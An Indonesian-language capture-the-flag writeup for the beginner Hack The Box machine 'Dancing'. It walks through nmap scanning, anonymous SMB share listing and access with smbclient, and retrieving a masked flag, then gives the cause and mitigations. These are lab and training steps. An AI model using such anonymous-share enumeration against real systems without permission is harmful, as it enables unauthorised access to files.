# HTB Starting Point - Dancing (Writeup)

**Platform:** Hack The Box - Starting Point  
**Tier:** 0 (Pemula)  
**Kategori:** SMB / Misconfiguration / Anonymous Share

---

# Ringkasan
Mesin *Dancing* mengajarkan cara melakukan scanning port menggunakan Nmap, menemukan service SMB, melakukan enumerasi share SMB, lalu mengakses share yang terbuka tanpa autentikasi.  
Dari share tersebut ditemukan file flag.
---

# Tools yang Digunakan
- Nmap
- smbclient
- enum4linux (opsional)

---
# Informasi Target
**Nama Mesin:** Dancing
**IP Target:** 10.129.153.208

---

# 1. Reconnaissance (Scanning)

Langkah pertama adalah melakukan scanning untuk mengetahui port yang terbuka.

Command:
```bash
nmap -sC -sV 10.129.153.208
```
Hasil penting biasanya menunjukkan:
- 445/tcp open microsoft-ds
- 139/tcp open netbios-ssn

**Port 445/139 menandakan service SMB (Server Message Block) aktif.**

# 2. Enumeration SMB (Server Message Block)

SMB biasanya digunakan untuk file sharing di sistem Windows.
Jika SMB salah konfigurasi, attacker dapat mengakses share tanpa kredensial.

Langkah pertama adalah melihat daftar share yang tersedia.

Command:
```bash
smbclient -L //10.129.153.208 -N
```

Keterangan:
- -L = list share
- -N = no password (anonymous)

Jika berhasil, akan muncul daftar share seperti:

- ADMIN$
- C$
- IPC$
- share custom (misalnya WorkShares)

# 3. Mengakses Share SMB

Setelah menemukan share yang bisa diakses, masuk ke share tersebut.

Command:
```bash
smbclient //10.129.153.208/WorkShares -N
```

Jika berhasil, kita akan masuk ke prompt smb:
```bash
smb: \>
```

Untuk melihat isi folder:
```bash
ls
```

Jika ada folder, masuk menggunakan:
```bash
cd <folder>
ls
```

# 4. Download File Flag

Jika menemukan file flag (misalnya flag.txt), download dengan:
```bash
get flag.txt
```

Keluar dari smbclient:
```bash
exit
```

Setelah file berhasil di-download, baca di Linux:
```bash
cat flag.txt
```

Flag akan muncul.
```bash
HTB{*******************************}
```

# 5. Analisis Kerentanan
Penyebab Masalah

*Server SMB mengizinkan akses anonymous ke share tertentu, sehingga attacker dapat membaca isi file tanpa autentikasi.*

**Kategori masalah:**

- Misconfiguration
- Broken Access Control
- Information Disclosure

**Dampak**

- Jika sistem nyata menggunakan konfigurasi ini, attacker dapat:
- mencuri file sensitif
- mendapatkan konfigurasi internal
- menemukan kredensial tersembunyi
- mempermudah akses lanjutan ke sistem

# 6. Mitigasi (Rekomendasi Keamanan)

**Solusi yang seharusnya dilakukan administrator:**

- Nonaktifkan anonymous/guest access pada SMB
- Batasi share hanya untuk user tertentu
- Terapkan permission file yang benar
- Gunakan firewall untuk membatasi port 139/445
- Audit share secara rutin
